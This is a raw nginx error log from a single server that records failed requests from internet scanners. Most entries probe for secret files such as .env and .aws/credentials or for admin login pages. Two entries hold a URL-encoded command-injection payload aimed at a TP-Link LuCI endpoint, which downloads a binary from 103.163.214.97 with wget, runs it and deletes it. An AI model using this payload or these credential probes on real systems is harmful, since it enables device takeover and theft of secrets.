2024/04/07 11:13:10 [error] 7225#7225: *254270 open() "/var/www/html/systembc/password.php" failed (2: No such file or directory), client: 45.56.108.128, server: localhost-nginx-proxy-manager, request: "GET /systembc/password.php HTTP/1.0"
2024/04/07 11:17:59 [error] 7225#7225: *254271 open() "/var/www/html/.env" failed (2: No such file or directory), client: 80.94.92.96, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 11:34:14 [error] 7225#7225: *254278 open() "/var/www/html/.env" failed (2: No such file or directory), client: 54.37.79.75, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 11:54:29 [error] 7242#7242: *254320 open() "/var/www/html/WvDK" failed (2: No such file or directory), client: 45.79.149.111, server: localhost-nginx-proxy-manager, request: "GET /WvDK HTTP/1.1", host: "128.199.74.189"
2024/04/07 11:54:30 [error] 7242#7242: *254321 open() "/var/www/html/5Ojo" failed (2: No such file or directory), client: 45.79.149.111, server: localhost-nginx-proxy-manager, request: "GET /5Ojo HTTP/1.1", host: "128.199.74.189"
2024/04/07 13:10:32 [error] 7260#7260: *254645 open() "/var/www/html/.env" failed (2: No such file or directory), client: 54.36.115.221, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 13:19:29 [error] 7260#7260: *254683 open() "/var/www/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 185.224.128.34, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "128.199.74.189:80"
2024/04/07 14:57:05 [error] 7293#7293: *257611 open() "/var/www/html/.env" failed (2: No such file or directory), client: 54.36.115.221, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 15:41:19 [error] 7311#7311: *257660 open() "/var/www/html/.env" failed (2: No such file or directory), client: 188.215.235.116, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 15:51:22 [error] 7311#7311: *257696 open() "/var/www/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 185.224.128.34, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "128.199.74.189:80"
2024/04/07 15:58:36 [error] 7311#7311: *257698 open() "/var/www/html/.env" failed (2: No such file or directory), client: 188.215.235.242, server: localhost-nginx-proxy-manager, request: "HEAD /.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 16:19:59 [alert] 7311#7311: *258694 512 worker_connections are not enough while connecting to upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "128.199.74.189"
2024/04/07 16:26:51 [error] 7311#7311: *258698 open() "/var/www/html/manage/account/login" failed (2: No such file or directory), client: 3.10.207.124, server: localhost-nginx-proxy-manager, request: "GET /manage/account/login HTTP/1.1", host: "128.199.74.189"
2024/04/07 16:41:24 [error] 7336#7336: *260542 open() "/var/www/html/manager/text/list" failed (2: No such file or directory), client: 162.243.146.49, server: localhost-nginx-proxy-manager, request: "GET /manager/text/list HTTP/1.1", host: "128.199.74.189"
2024/04/07 16:50:59 [error] 7336#7336: *260837 open() "/var/www/html/+CSCOE+/logon.html" failed (2: No such file or directory), client: 3.10.207.124, server: localhost-nginx-proxy-manager, request: "GET /+CSCOE+/logon.html HTTP/1.1", host: "128.199.74.189"
2024/04/07 16:59:49 [error] 7336#7336: *260840 open() "/var/www/html/cgi-bin/login.cgi" failed (2: No such file or directory), client: 3.10.207.124, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/login.cgi HTTP/1.1", host: "128.199.74.189"
2024/04/07 17:05:57 [error] 7336#7336: *260877 open() "/var/www/html/.env" failed (2: No such file or directory), client: 54.36.115.221, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 17:08:19 [error] 7336#7336: *260893 open() "/var/www/html/logon.htm" failed (2: No such file or directory), client: 3.10.207.124, server: localhost-nginx-proxy-manager, request: "GET /logon.htm HTTP/1.1", host: "128.199.74.189"
2024/04/07 17:16:30 [error] 7336#7336: *260910 open() "/var/www/html/login.jsp" failed (2: No such file or directory), client: 3.10.207.124, server: localhost-nginx-proxy-manager, request: "GET /login.jsp HTTP/1.1", host: "128.199.74.189"
2024/04/07 18:15:29 [error] 7351#7351: *261095 open() "/var/www/html/feed/jolts.rss" failed (2: No such file or directory), client: 74.91.119.51, server: localhost-nginx-proxy-manager, request: "GET /feed/jolts.rss HTTP/1.1", host: "www.bls.gov"
2024/04/07 18:26:18 [error] 7351#7351: *261155 open() "/var/www/html/.env" failed (2: No such file or directory), client: 54.36.115.221, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:45:57 [error] 7384#7384: *263622 open() "/var/www/html/vendor/.env" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /vendor/.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:45:57 [error] 7384#7384: *263623 open() "/var/www/html/.env" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:45:58 [error] 7384#7384: *263624 open() "/var/www/html/.env.txt" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /.env.txt HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:45:58 [error] 7384#7384: *263625 open() "/var/www/html/env.txt" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /env.txt HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:45:59 [error] 7384#7384: *263626 open() "/var/www/html/.env.bak" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /.env.bak HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:45:59 [error] 7384#7384: *263627 open() "/var/www/html/.aws/credentials/phpinfo" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /.aws/credentials/phpinfo HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:46:00 [error] 7384#7384: *263628 open() "/var/www/html/phpinfo.php" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /phpinfo.php HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:46:00 [error] 7384#7384: *263629 open() "/var/www/html/aws.yml" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /aws.yml HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:46:01 [error] 7384#7384: *263630 open() "/var/www/html/info.php" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /info.php HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:46:01 [error] 7384#7384: *263631 open() "/var/www/html/config/aws.yml" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /config/aws.yml HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:46:02 [error] 7384#7384: *263632 open() "/var/www/html/.env.example" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /.env.example HTTP/1.1", host: "128.199.74.189"
2024/04/07 19:46:02 [error] 7384#7384: *263633 open() "/var/www/html/.env_old" failed (2: No such file or directory), client: 134.209.163.255, server: localhost-nginx-proxy-manager, request: "GET /.env_old HTTP/1.1", host: "128.199.74.189"
